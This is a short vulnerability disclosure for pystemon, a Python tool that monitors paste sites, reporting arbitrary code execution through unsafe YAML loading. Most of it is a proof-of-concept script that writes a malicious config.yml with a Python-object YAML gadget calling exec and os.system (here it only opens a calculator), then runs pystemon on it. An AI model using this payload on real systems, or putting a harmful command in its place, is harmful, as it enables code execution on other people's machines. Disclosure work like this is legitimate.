# Description

`pystemon` is a Monitoring tool for PasteBin-alike sites written in Python, which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/cvandeplas/pystemon
```

### Run exploit.py
```
import os
#os.system('git clone https://github.com/cvandeplas/pystemon')
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(exploit)
os.system('python pystemon/pystemon.py -c config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
